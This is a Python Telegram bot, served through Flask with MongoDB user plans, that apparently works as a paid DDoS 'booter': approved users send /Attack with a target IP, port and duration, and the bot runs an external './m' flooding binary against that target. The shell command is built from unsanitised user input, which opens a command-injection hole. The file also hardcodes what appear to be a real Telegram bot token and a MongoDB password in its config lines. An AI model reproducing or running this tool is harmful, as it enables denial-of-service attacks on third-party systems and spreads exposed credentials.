import os
import telebot
from telebot.types import Update
from flask import Flask, request
import logging
from pymongo import MongoClient
from datetime import datetime, timedelta
import asyncio
import certifi
from threading import Thread

# ========== CONFIG ==========
TOKEN = os.getenv("8035669864:AAHWCCuLZHpHDjuBHfp9SyC8d6z0w_mPKAg")
MONGO_URI = os.getenv("mongodb+srv://ihatemosquitos9:JvOK4gNs0SH5SVw9@cluster0.1pd5kt5.mongodb.net/?appName=Cluster0")
CHANNEL_ID = int(os.getenv("8035669864"))

bot = telebot.TeleBot(TOKEN, threaded=False)
app = Flask(__name__)

loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client["NOOB"]
users_collection = db.users

REQUEST_INTERVAL = 1
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
running_processes = []


# ========== WEBHOOK HANDLER ==========
@app.route("/webhook", methods=["POST"])
def webhook():
    if request.data:
        update = Update.de_json(request.get_json(force=True))
        bot.process_new_updates([update])
    return "ok", 200


@app.route("/")
def home():
    return "Bot is running", 200


# ========== UTILITY FUNCTIONS ==========
def check_user_approval(user_id):
    user_data = users_collection.find_one({"user_id": user_id})
    return bool(user_data and user_data.get("plan", 0) > 0)


def send_not_approved_message(chat_id):
    bot.send_message(chat_id, "❌ You are not approved to use this command.")


# ====== START COMMAND ======
@bot.message_handler(commands=["start"])
def start(message):
    bot.reply_to(message, "Bot is working!")


# ========== ATTACK COMMAND ==========
async def run_attack_async(target_ip, target_port, duration, chat_id, username, msg_id):
    try:
        cmd = f"./m {target_ip} {target_port} {duration}"

        process = await asyncio.create_subprocess_shell(cmd)
        running_processes.append(process)

        await asyncio.sleep(duration)

        bot.delete_message(chat_id, msg_id)
        bot.send_message(chat_id, "Attack Completed.")
    except Exception as e:
        logging.error(e)


def process_attack(message):
    args = message.text.split()
    if len(args) != 3:
        bot.send_message(message.chat.id, "Invalid format: <IP> <Port> <Duration>")
        return

    ip, port, duration = args
    start_msg = bot.send_message(message.chat.id, "Attack Started...")

    asyncio.run_coroutine_threadsafe(
        run_attack_async(ip, int(port), int(duration),
                         message.chat.id,
                         message.from_user.username,
                         start_msg.message_id),
        loop
    )


@bot.message_handler(commands=["Attack"])
def attack(message):
    if not check_user_approval(message.from_user.id):
        send_not_approved_message(message.chat.id)
        return

    bot.send_message(message.chat.id, "Send <IP> <Port> <Duration>")
    bot.register_next_step_handler(message, process_attack)


# ========== ASYNC LOOP ==========
def start_async_loop():
    loop.run_forever()


Thread(target=start_async_loop, daemon=True).start()


# ========== FLASK SERVER ==========
if __name__ == "__main__":
    port = int(os.getenv("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
